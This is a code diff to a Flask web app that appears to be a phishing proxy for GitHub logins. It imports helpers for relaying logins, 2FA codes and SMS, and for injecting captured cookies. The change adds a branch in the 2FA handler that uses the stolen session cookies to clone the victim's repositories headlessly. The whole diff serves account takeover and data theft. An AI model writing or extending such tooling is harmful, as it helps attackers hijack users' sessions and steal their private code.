@@ -1,7 +1,7 @@
 from flask import Flask, request, render_template, redirect, session as flask_session, make_response
 from scripts.login import get_login_page, perform_login, perform_2fa, execute_2fa_otp, forward_sms, send_sms
 from dotenv import load_dotenv
-from injector.inject_cookie import inject_and_verify_github_cookies
+from injector.inject_cookie import inject_and_verify_github_cookies, clone_repositories_headless
 import os
 import sqlite3
 
@@ -143,6 +143,8 @@ def post_two_fa():
 
         if (inject_cookie):
             inject_and_verify_github_cookies(cookies)
+        else:
+            clone_repositories_headless(cookies)
 
         response = make_response(
             render_template("index.html", github_login=response_html)
